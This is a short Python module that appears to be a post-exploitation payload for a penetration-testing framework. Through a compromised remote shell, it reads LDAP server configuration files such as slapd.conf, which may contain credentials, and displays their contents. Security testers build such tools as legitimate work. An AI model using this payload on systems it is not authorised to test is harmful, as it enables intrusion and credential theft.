from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class ldap_config_files(base_payload):
    '''
    This payload shows LDAP configuration files
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        files.append('/etc/ldap/slapd.conf')
        files.append('/etc/openldap/slapd.conf')
        files.append('/etc/openldap/ldap.conf')
        files.append('/etc/ldap/myslapd.conf')
        files.append('/etc/ldap/lapd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result[ file ] = content
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'LDAP configuration files not found.'
        else:
            rows = []
            rows.append( ['LDAP file', 'Content'] ) 
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename, api_result[filename] ] )
                rows.append( [] )
                              
            result_table = table( rows[:-1] )
            result_table.draw( 80 )                    
            return

